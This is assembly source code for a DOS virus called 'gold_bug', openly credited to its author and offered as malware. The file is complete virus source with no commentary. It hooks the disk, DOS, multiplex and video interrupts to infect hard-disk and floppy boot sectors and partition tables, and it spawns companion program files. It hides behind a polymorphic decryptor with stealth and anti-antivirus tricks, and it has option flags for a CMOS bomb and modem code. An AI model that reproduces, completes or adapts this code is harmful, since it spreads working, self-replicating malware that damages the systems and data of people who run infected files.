cseg            segment para    public  'code'
gold_bug        proc    near
assume          cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186
TRUE            equ     001h
FALSE           equ     000h

;-----------------------------------------------------------------------------

;option                              bytes used and where

DELETE_SCANNERS equ     FALSE   ; -2 bytes  -2 in com_code
CHECK_FOR_8088  equ     TRUE    ;  4 bytes   4 in com_code
INFECT_RANDOM   equ     TRUE    ;  4 bytes   4 in com_code
CMOS_BOMB       equ     TRUE    ;  4 bytes   4 in com_code
DEFLECT_DELETE  equ     TRUE    ;  5 bytes   5 in com_code
READING_STEALTH equ     TRUE    ;  5 bytes   5 in com_code
SAME_FILE_DATE  equ     TRUE    ; 24 bytes  24 in com_code
DOUBLE_DECRYPT  equ     TRUE    ; 26 bytes  26 in com_code
EXECUTE_SPAWNED equ     TRUE    ; 35 bytes  32 in com_code  3 in boot_code
MODEM_CODE      equ     TRUE    ; 40 bytes  29 in com_code 11 in boot_code
ANTI_ANTIVIRUS  equ     TRUE    ; 46 bytes  35 in com_code 11 in boot_code
POLYMORPHIC     equ     TRUE    ; 90 bytes  74 in com_code 16 in boot_code
MULTIPARTITE    equ     TRUE    ;372 bytes 346 in com_code 26 in boot_code

;-----------------------------------------------------------------------------

;floppy boot infection

FLOPPY_1_2M     equ     001h
FLOPPY_760K     equ     000h
FLOPPY_TYPE     equ     FLOPPY_1_2M

;-----------------------------------------------------------------------------

IFE MULTIPARTITE
DELETE_SCANNERS equ     FALSE
CHECK_FOR_8088  equ     FALSE
INFECT_RANDOM   equ     FALSE
DEFLECT_DELETE  equ     FALSE
READING_STEALTH equ     FALSE
SAME_FILE_DATE  equ     FALSE
EXECUTE_SPAWNED equ     FALSE
POLYMORPHIC     equ     FALSE
ENDIF

;-----------------------------------------------------------------------------

SECTOR_SIZE     equ     00200h
RES_OFFSET      equ     0fb00h
COM_OFFSET      equ     00100h
RELATIVE_OFFSET equ     RES_OFFSET-COM_OFFSET
PART_OFFSET     equ     COM_OFFSET+SECTOR_SIZE
BOOT_OFFSET     equ     07c00h
RELATIVE_BOOT   equ     BOOT_OFFSET-PART_OFFSET
LOW_JMP_10      equ     0031ch
LOW_JMP_21      equ     00321h
SAVE_INT_CHAIN  equ     0032ch
SCRATCH_AREA    equ     08000h
HEADER_SEGMENT  equ     00034h
INT_21_IS_NOW   equ     0cch
BIOS_INT_13     equ     0c6h
NEW_INT_13_LOOP equ     0cdh
BOOT_SECTOR     equ     001h
DESCRIPTOR_OFF  equ     015h
IF FLOPPY_TYPE EQ FLOPPY_1_2M
DESCRIPTOR      equ     0f909h
OLD_BOOT_SECTOR equ     00eh
COM_CODE_SECTOR equ     00dh
ELSE
DESCRIPTOR      equ     0f905h
OLD_BOOT_SECTOR equ     005h
COM_CODE_SECTOR equ     004h
ENDIF
READ_ONLY       equ     001h
SYSTEM          equ     004h
DELTA_RI        equ     004h
DSR             equ     020h
CTS             equ     010h
CD              equ     080h
FAR_JUMP        equ     0eah
MIN_FILE_SIZE   equ     00500h
PSP_SIZE        equ     00100h
VIRGIN_INT_13_A equ     00806h
VIRGIN_INT_13_B equ     007b4h
VIRGIN_INT_2F   equ     00706h
FAR_JUMP_OFFSET equ     006h
SET_INT_OFFSET  equ     007h
CHANGE_SEG_OFF  equ     009h
VIDEO_MODE      equ     00449h
MONOCHROME      equ     007h
COLOR_VIDEO_MEM equ     0b000h
ADDR_MUL        equ     004h
SINGLE_BYTE_INT equ     003h
VIDEO_INT       equ     010h
VIDEO_INT_ADDR  equ     VIDEO_INT*ADDR_MUL
DISK_INT        equ     013h
DISK_INT_ADDR   equ     DISK_INT*ADDR_MUL
SERIAL_INT      equ     014h
DOS_INT         equ     021h
DOS_INT_ADDR    equ     DOS_INT*ADDR_MUL
MULTIPLEX_INT   equ     02fh
COMMAND_LINE    equ     080h
FIRST_FCB       equ     05ch
SECOND_FCB      equ     06ch
NULL            equ     00000h
GET_PORT_STATUS equ     00300h
WRITE_TO_PORT   equ     00100h
HD_0_HEAD_0     equ     00080h
READ_A_SECTOR   equ     00201h
WRITE_A_SECTOR  equ     00301h
GET             equ     000h
SET             equ     001h
DELETE_W_FCB    equ     01300h
DEFAULT_DRIVE   equ     000h
GET_DEFAULT_DR  equ     01900h
DOS_SET_INT     equ     02500h
FILE_DATE_TIME  equ     05700h
DENYNONE        equ     040h
OPEN_W_HANDLE   equ     03d00h
READ_W_HANDLE   equ     03f00h
WRITE_W_HANDLE  equ     04000h
CLOSE_HANDLE    equ     03e00h
UNLINK          equ     04100h
FILE_ATTRIBUTES equ     04300h
RESIZE_MEMORY   equ     04a00h
QUERY_FREE_HMA  equ     04a01h
ALLOCATE_HMA    equ     04a02h
EXEC_PROGRAM    equ     04b00h
GET_ERROR_LEVEL equ     04d00h
TERMINATE_W_ERR equ     04c00h
RENAME_A_FILE   equ     05600h
LSEEK_TO_END    equ     04202h
CREATE_NEW_FILE equ     05b00h
RESIDENT_LENGTH equ     068h
PARAMETER_TABLE equ     005f1h
MAX_PATH_LENGTH equ     00080h
EXE_HEADER_SIZE equ     020h
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
PKLITE_SIGN     equ     'KP'
PKLITE_OFFSET   equ     01eh
NO_OF_COM_PORTS equ     004h
WINDOWS_BEGIN   equ     01605h
WINDOWS_END     equ     01606h
ERROR_IN_EXE    equ     0000bh
IF POLYMORPHIC
FILE_SIGNATURE  equ     07081h
XOR_SWAP_OFFSET equ     byte ptr ((offset serial_number)-(offset com_code))+TWO_BYTES
FILE_LEN_OFFSET equ     byte ptr ((offset serial_number)-(offset com_code))+THREE_BYTES
FIRST_UNDO_OFF  equ     byte ptr ((offset first_jmp)-(offset com_code)+ONE_BYTE)
SECOND_UNDO_OFF equ     byte ptr ((offset second_jmp)-(offset com_code))
BL_BX_OFFSET    equ     byte ptr ((offset incbl_incbx)-(offset com_code))
ROTATED_OFFSET  equ     byte ptr ((offset rotated_code)-(offset com_code))
ELSE
FILE_SIGNATURE  equ     0070eh
ENDIF
IF MODEM_CODE
STRING_LENGTH   equ     byte ptr ((offset partition_sig)-(offset string))
ENDIF
IF EXECUTE_SPAWNED
EXEC_SUBTRACT   equ     byte ptr ((offset file_name)-(offset exec_table))
ENDIF
DH_OFFSET       equ     byte ptr ((offset dh_value )-(offset initialize_boot)+TWO_BYTES)
ONE_NIBBLE      equ     004h
ONE_BYTE        equ     001h
TWO_BYTES       equ     002h
THREE_BYTES     equ     003h
FOUR_BYTES      equ     004h
FIVE_BYTES      equ     005h
FIVE_BITS       equ     005h
EIGHT_BYTES     equ     008h
USING_HARD_DISK equ     080h
KEEP_CF_INTACT  equ     002h
CMOS_CRC_ERROR  equ     02eh
CMOS_PORT       equ     070h
REMOVE_NOP      equ     001h
CR              equ     00dh
LF              equ     00ah
INT3_INCBX      equ     043cch
INC_BL          equ     0c3feh
INCBX_INCBL_XOR equ     INT3_INCBX XOR INC_BL
JMP_NO_SIGN     equ     079h
JMP_NOT_ZERO    equ     075h
JNS_JNZ_XOR     equ     JMP_NO_SIGN XOR JMP_NOT_ZERO
CLI_PUSHCS      equ     00efah

;-----------------------------------------------------------------------------

video_seg       segment at 0c000h
		org     00000h
original_int_10 label   word
video_seg       ends

;-----------------------------------------------------------------------------

io_seg          segment at 00070h
		org     00893h
original_2f_jmp label   word
io_seg          ends

;-----------------------------------------------------------------------------

		org     COM_OFFSET
com_code:

;-----------------------------------------------------------------------------

		IF      POLYMORPHIC
first_decode    proc    near
serial_number:  xor     word ptr ds:[si+bx+FIRST_UNDO_OFF],MIN_FILE_SIZE
		org     $-REMOVE_NOP
		org     $-FIVE_BYTES
		jmp     load_it
		org     $+TWO_BYTES
rotated_code:   int     SINGLE_BYTE_INT
		into
		adc     al,0d4h
incbl_incbx:    inc     bl
first_jmp:      jnz     serial_number
		add     bx,si
		jns     serial_number
first_decode    endp

;-----------------------------------------------------------------------------

		IF      DOUBLE_DECRYPT
second_decode   proc    near
		push    si
get_next_byte:  lodsw
		add     bx,ax
		inc     bx
		xor     byte ptr ds:[si+SECOND_UNDO_OFF],bl
		org     $-REMOVE_NOP
		dec     si
second_jmp:     jns     get_next_byte
		pop     si
second_decode   endp
		ENDIF
		ENDIF

;-----------------------------------------------------------------------------

com_start       proc    near
		IF      MULTIPARTITE
		push    cs
		pop     es
		call    full_move_w_si
		mov     ds,cx
		cmp     cx,word ptr ds:[NEW_INT_13_LOOP*ADDR_MUL]
		jne     dont_set_int
		mov     di,VIRGIN_INT_13_B
		call    set_both_ints
		push    cs
		pop     es
		ENDIF
dont_set_int:   IF      CHECK_FOR_8088
		mov     cl,RESIDENT_LENGTH
		mov     al,high(RESIZE_MEMORY)
		shl     ax,cl
		mov     bx,cx
		int     DOS_INT
		ELSEIF  MULTIPARTITE
		mov     bx,RESIDENT_LENGTH
		mov     ah,high(RESIZE_MEMORY)
		int     DOS_INT
		ENDIF
		IF      EXECUTE_SPAWNED
		pusha
		call    from_com_code+RELATIVE_OFFSET
		popa
		push    cs
		pop     ds
		push    cs
		pop     es
		cmpsw
		mov     dx,si
		sub     si,EXEC_SUBTRACT
		org     $-REMOVE_NOP
		mov     bx,PARAMETER_TABLE
		mov     di,bx
		mov     ax,EXEC_PROGRAM
set_table:      scasw
		movsb
		scasb
		mov     word ptr ds:[di],ds
		je      set_table
		int     DOS_INT
		mov     ah,high(GET_ERROR_LEVEL)
		int     DOS_INT
		mov     ah,high(TERMINATE_W_ERR)
		ELSEIF  MULTIPARTITE
		call    from_com_code+RELATIVE_OFFSET
		mov     ax,TERMINATE_W_ERR
		ENDIF
		IF      MULTIPARTITE
		int     DOS_INT
		ELSE
		jmp     boot_load
		ENDIF
com_start       endp


;-----------------------------------------------------------------------------

high_code       proc    near
		mov     dx,offset int_10_start+RELATIVE_OFFSET
		mov     bx,LOW_JMP_10-FAR_JUMP_OFFSET
		call    set_int_10_21
		mov     bx,VIDEO_INT_ADDR-SET_INT_OFFSET
low_code:       mov     es,cx
		mov     cl,OLD_BOOT_SECTOR
		mov     dx,LOW_JMP_10
		call    set_interrupt
		mov     bx,BOOT_OFFSET
		pop     dx
		int     DISK_INT
		xor     dh,dh
		mov     cl,BOOT_SECTOR
		mov     ax,WRITE_A_SECTOR
high_code       endp

;-----------------------------------------------------------------------------

interrupt_13    proc    far
int_13_start:   IF      MULTIPARTITE
		mov     byte ptr cs:[drive_letter+ONE_BYTE+RELATIVE_OFFSET],dl
		ENDIF
		cmp     cx,BOOT_SECTOR
		jne     no_boot_sector
		cmp     ah,high(READ_A_SECTOR)
		jne     no_boot_sector
		cmp     dx,HD_0_HEAD_0
		jbe     reread_boot
no_boot_sector: int     NEW_INT_13_LOOP
		jmp     short return_far
reread_boot:    int     NEW_INT_13_LOOP
		jc      return_far
		pusha
		push    ds
		push    es
		pop     ds
check_old_boot: mov     ax,READ_A_SECTOR
		xor     dh,dh
		mov     cl,OLD_BOOT_SECTOR
		IF      ANTI_ANTIVIRUS
		cmp     word ptr ds:[bx],'HC'
		ELSE
		cmp     word ptr ds:[bx],CLI_PUSHCS
		ENDIF
		je      read_old_boot
		test    dl,USING_HARD_DISK
		jnz     encode_hd
		cmp     word ptr ds:[bx+DESCRIPTOR_OFF-ONE_BYTE],DESCRIPTOR
		jne     time_to_leave
		mov     dh,al
		pusha
		int     NEW_INT_13_LOOP
		cmp     byte ptr ds:[bx],ch
		popa
		pushf
		pusha
		xor     dh,dh
		mov     cl,al
		int     NEW_INT_13_LOOP
		popa
		popf
		jne     time_to_leave
encode_hd:      mov     ah,high(WRITE_A_SECTOR)
		push    ax
		int     NEW_INT_13_LOOP
		pop     ax
		jc      time_to_leave
		mov     di,bx
		call    move_code
		mov     cl,COM_CODE_SECTOR
		IF      POLYMORPHIC
		xor     byte ptr ds:[bx+XOR_SWAP_OFFSET],dh
		org     $-REMOVE_NOP
		jo      dont_flip_it
		xchg    word ptr ds:[bx+ROTATED_OFFSET],ax
		org     $-REMOVE_NOP
		xchg    ah,al
		xchg    word ptr ds:[bx+ROTATED_OFFSET+TWO_BYTES],ax
		org     $-REMOVE_NOP
		xchg    word ptr ds:[bx+ROTATED_OFFSET],ax
		org     $-REMOVE_NOP
		ENDIF
dont_flip_it:   pusha
		int     NEW_INT_13_LOOP
		popa
		mov     di,bx
		call    move_some_more
		mov     byte ptr ds:[bx+DH_OFFSET],dh
		org     $-REMOVE_NOP
		mov     dh,cl
		inc     cx
		int     NEW_INT_13_LOOP
		jmp     short check_old_boot
read_old_boot:  mov     dh,byte ptr ds:[bx+DH_OFFSET]
		org     $-REMOVE_NOP
		int     NEW_INT_13_LOOP
time_to_leave:  pop     ds
		popa
		clc
return_far:     retf    KEEP_CF_INTACT
interrupt_13    endp

;-----------------------------------------------------------------------------

interrupt_2f    proc    far
		pusha
		push    ds
		push    es
		push    offset return_to_2f+RELATIVE_OFFSET
		xor     cx,cx
		mov     ds,cx
		mov     bx,SAVE_INT_CHAIN-SET_INT_OFFSET
		cmp     ax,WINDOWS_END
		jne     try_another
		les     dx,dword ptr ds:[bx+SET_INT_OFFSET]
		jmp     short set_13_chain
try_another:    cmp     ax,WINDOWS_BEGIN
		jne     another_return
		mov     di,VIRGIN_INT_13_B
		call    get_n_set_int+ONE_BYTE
		les     dx,dword ptr ds:[BIOS_INT_13*ADDR_MUL]
set_13_chain:   mov     ax,READ_A_SECTOR
		call    get_set_part
		mov     bx,VIRGIN_INT_13_B-SET_INT_OFFSET
		call    set_interrupt
		mov     bl,low(VIRGIN_INT_13_A-SET_INT_OFFSET)
		call    set_interrupt
		mov     ah,high(WRITE_A_SECTOR)
interrupt_2f    endp

;-----------------------------------------------------------------------------

get_set_part    proc    near
		pusha
		push    es
		mov     bx,SCRATCH_AREA
		mov     es,bx
		mov     dx,HD_0_HEAD_0
		inc     cx
		int     NEW_INT_13_LOOP
		mov     ax,READ_A_SECTOR
		int     DISK_INT
		pop     es
		popa
another_return: ret
get_set_part    endp

;-----------------------------------------------------------------------------

return_to_2f    proc    near
		pop     es
		pop     ds
		popa
		jmp     far ptr original_2f_jmp
return_to_2f    endp

;-----------------------------------------------------------------------------

interrupt_10    proc    far
int_10_start:   pushf
		pusha
		push    ds
		push    es
		push    offset a_return+RELATIVE_OFFSET
from_com_code:  xor     bx,bx
		mov     ds,bx
		or      ah,ah
		jz      set_10_back
		mov     ax,QUERY_FREE_HMA
		int     MULTIPLEX_INT
		cmp     bh,high(MIN_FILE_SIZE+SECTOR_SIZE)
		jb      another_return
		mov     ax,ALLOCATE_HMA
		int     MULTIPLEX_INT
		clc
		call    full_move_w_di
		mov     dx,offset int_13_start+RELATIVE_OFFSET
		call    set_13_chain
		mov     bx,VIRGIN_INT_2F-SET_INT_OFFSET
		mov     dx,offset interrupt_2f+RELATIVE_OFFSET
		call    set_interrupt
		cmp     word ptr ds:[LOW_JMP_10],cx
		je      set_10_back
		push    es
		push    es
		mov     di,DOS_INT_ADDR
		mov     bx,INT_21_IS_NOW*ADDR_MUL-SET_INT_OFFSET
		call    get_n_set_int+ONE_BYTE
		pop     ds
		mov     bx,offset old_int_10_21-SET_INT_OFFSET+RELATIVE_OFFSET+ONE_BYTE
		call    set_interrupt
		mov     ds,cx
		mov     ax,DOS_SET_INT+DOS_INT
		mov     dx,LOW_JMP_21
		int     INT_21_IS_NOW
		pop     es
		mov     bx,dx
		mov     dx,offset interrupt_21+RELATIVE_OFFSET
		mov     word ptr ds:[bx],0b450h
		mov     word ptr ds:[bx+TWO_BYTES],0cd19h
		mov     word ptr ds:[bx+FOUR_BYTES],05800h+INT_21_IS_NOW
		call    set_int_10_21
set_10_back:    mov     di,offset old_int_10_21+RELATIVE_OFFSET+ONE_BYTE
		mov     bx,LOW_JMP_10-FAR_JUMP_OFFSET
interrupt_10    endp

;-----------------------------------------------------------------------------

get_n_set_int   proc    near
		les     dx,dword ptr cs:[di]
		jmp     short set_interrupt
set_int_10_21:  mov     byte ptr ds:[bx+FAR_JUMP_OFFSET],FAR_JUMP
set_interrupt:  mov     word ptr ds:[bx+SET_INT_OFFSET],dx
		mov     word ptr ds:[bx+CHANGE_SEG_OFF],es
		ret
get_n_set_int   endp

;-----------------------------------------------------------------------------

		IF      MULTIPARTITE
set_both_ints   proc    near
		mov     bx,(NEW_INT_13_LOOP*ADDR_MUL)-SET_INT_OFFSET
		call    get_n_set_int+ONE_BYTE
		mov     bl,low(BIOS_INT_13*ADDR_MUL)-SET_INT_OFFSET
		jmp     short set_interrupt
set_both_ints   endp
		ENDIF

;-----------------------------------------------------------------------------

		IF      EXECUTE_SPAWNED
exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB
		ENDIF

;-----------------------------------------------------------------------------

		IF      MODEM_CODE
		org     PART_OFFSET+001f3h
string          db      CR,'1O7=0SLMTA'
		ENDIF

;-----------------------------------------------------------------------------

		org     PART_OFFSET+SECTOR_SIZE-TWO_BYTES
partition_sig   dw      0aa55h

;-----------------------------------------------------------------------------

		org     PART_OFFSET+SECTOR_SIZE+TWO_BYTES
file_name       db      'DA',027h,'BOYS.COM',NULL

;-----------------------------------------------------------------------------

		org     PARAMETER_TABLE
		dw      NULL,NULL,NULL,NULL,NULL,NULL,NULL
		db      NULL

;-----------------------------------------------------------------------------

		IFE     MULTIPARTITE
boot_load       proc    near
		push    cs
		pop     es
		call    full_move_w_si
		mov     ds,cx
		cmp     cx,word ptr ds:[NEW_INT_13_LOOP*ADDR_MUL]
		jne     dont_set_intcd
		lds     dx,dword ptr ds:[VIRGIN_INT_13_B]
		mov     ax,DOS_SET_INT+NEW_INT_13_LOOP
		int     DOS_INT
dont_set_intcd: mov     ah,high(GET_DEFAULT_DR)
		int     DOS_INT
		call    from_com_code+RELATIVE_OFFSET
		mov     ax,TERMINATE_W_ERR
		int     DOS_INT
boot_load       endp
		ENDIF

;-----------------------------------------------------------------------------

		IF      POLYMORPHIC
load_it         proc    near
		mov     word ptr ds:[si],FILE_SIGNATURE
		mov     byte ptr ds:[si+TWO_BYTES],FIRST_UNDO_OFF
		push    bx
		xor     ax,ax
		cli
		out     043h,al
		in      al,040h
		mov     ah,al
		in      al,040h
		sti
		push    ax
		and     ax,0001eh
		mov     bx,ax
		mov     ax,word ptr ds:[bx+two_byte_table]
		mov     word ptr ds:[si+ROTATED_OFFSET+TWO_BYTES],ax
		org     $-REMOVE_NOP
		pop     ax
		and     ax,003e0h
		mov     cl,FIVE_BITS
		shr     ax,cl
		mov     bx,ax
		mov     al,byte ptr ds:[bx+one_byte_table]
		xor     al,low(INC_BL)
		mov     byte ptr ds:[swap_incbx_bl+THREE_BYTES],al
		pop     bx
		jmp     com_start
load_it         endp

;-----------------------------------------------------------------------------

two_byte_table: mov     al,0b2h
		xor     al,0b4h
		and     al,0d4h
		les     ax,dword ptr ds:[si]
		les     cx,dword ptr ds:[si]
		les     bp,dword ptr ds:[si]
		adc     al,0d4h
		and     al,084h
		adc     al,084h
		adc     al,024h
		add     al,084h
		add     al,014h
		add     al,024h
		test    dl,ah
		repz    stc
		repnz   stc

;-----------------------------------------------------------------------------

one_byte_table: int     SINGLE_BYTE_INT
		into
		daa
		das
		aaa
		aas
		inc     ax
		inc     cx
		inc     dx
		inc     bp
		inc     di
		dec     ax
		dec     cx
		dec     dx
		dec     bp
		dec     di
		nop
		xchg    ax,cx
		xchg    ax,dx
		xchg    ax,bp
		xchg    ax,di
		cbw
		cwd
		lahf
		scasb
		scasw
		xlat
		repnz
		repz
		cmc
		clc
		stc
		ENDIF

;-----------------------------------------------------------------------------

gold_bug        endp
cseg            ends
end             com_code
